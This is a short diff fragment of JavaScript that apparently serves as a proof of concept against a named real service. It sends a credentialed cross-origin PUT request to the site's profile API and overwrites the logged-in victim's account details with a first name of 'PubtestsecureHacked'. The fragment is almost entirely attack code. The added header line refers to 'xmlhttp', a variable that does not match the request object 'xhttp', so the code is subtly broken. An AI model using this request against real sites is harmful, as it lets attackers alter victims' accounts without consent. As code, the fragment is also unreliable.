@@ -2045,6 +2045,7 @@
               var xhttp = new XMLHttpRequest();
               xhttp.open("PUT", "https://login.teads.tv/api/profile/me", true);
   xhttp.withCredentials = true;
+            xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
   xhttp.send(JSON.stringify({"id":57584,"email":"pubtestsecure@gmail.com","culture":"en_US","firstname":"PubtestsecureHacked","lastname":"Test","timezone":"Europe/Paris"}));
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4) {
